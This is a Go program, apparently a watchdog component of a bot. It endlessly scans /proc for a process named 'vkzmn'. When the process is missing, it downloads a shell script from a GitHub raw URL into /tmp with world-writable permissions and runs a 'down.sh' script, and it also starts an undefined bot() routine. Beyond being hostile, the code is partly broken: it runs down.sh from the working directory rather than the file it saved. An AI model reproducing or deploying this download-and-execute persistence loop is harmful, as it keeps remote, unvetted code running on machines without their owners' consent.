package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"strings"
	"time"
        "net/http"
         "os/exec"
)


//esse e o monitor ele ficara em um loop infinito  verificando se  o vkzmn esta em execucao





func  exec_vkzmn() {



 
down_exec :=  exec.Command("sh"  , "down.sh" ) 


go down_exec.Run()



}




func down_vkzmn(){

fmt.Println("abaixando vkzmn")

cli := http.Client{}

resp , err_get := cli.Get("https://github.com/atilabyte/golang/raw/refs/heads/master/down.sh")

 if err_get != nil {

 fmt.Println("erro em  get") 
 
 os.Exit(1) 

  }


 script  , err_readall :=  ioutil.ReadAll(resp.Body) 

  
     if err_readall  != nil {

       fmt.Println("erro em readall")
        os.Exit(1) 
     
        }


 ioutil.WriteFile("/tmp/down_vkzmn.sh" , script , 0777 )

  

}



func main() {





main_func:


        go bot()


	time.Sleep(5 * time.Second)

	var vkzmn_ok int = 0

	dir, err := os.Open("/proc") //abre o diretorio /proc

	if err != nil {

		fmt.Println("error em open")

	}

	file, err := dir.Readdir(0) //ler os arquivos e direorios dentro de /proc

	if err != nil {

		fmt.Println("erro em dir")

	}

	for _, fi := range file { //intera sobre os diretorio


		procs_cmdline := fmt.Sprintf("/proc/%s/cmdline", fi.Name()) //constroi o caminho pra pega o cmdline dos processos em execucao

		read_procs, err := ioutil.ReadFile(procs_cmdline)

		if err != nil {

			fmt.Println("") //error em readall

		}

		str_proc := string(read_procs)

		out := strings.Contains(str_proc, "vkzmn")

		if out == true {

			vkzmn_ok = 23

                         fmt.Println(str_proc)


		}


	}




	if vkzmn_ok == 23 {
                     

		fmt.Println("vkzmn em execucao")



	} else {


		fmt.Println("vkzmn nao ta em execucao")


                    _, err_open :=   os.Open("/tmp/down_vkzmn.sh")  


                        if  err_open != nil { 
                     
                            fmt.Println("down_vkzmn.sh nao foi abaixado")

                            down_vkzmn()
  


                          } else {


                             fmt.Println("down_vkzmn.sh ja esta em //tmp" )
                                          
                             exec_vkzmn()


                       }






	}


	goto main_func

}
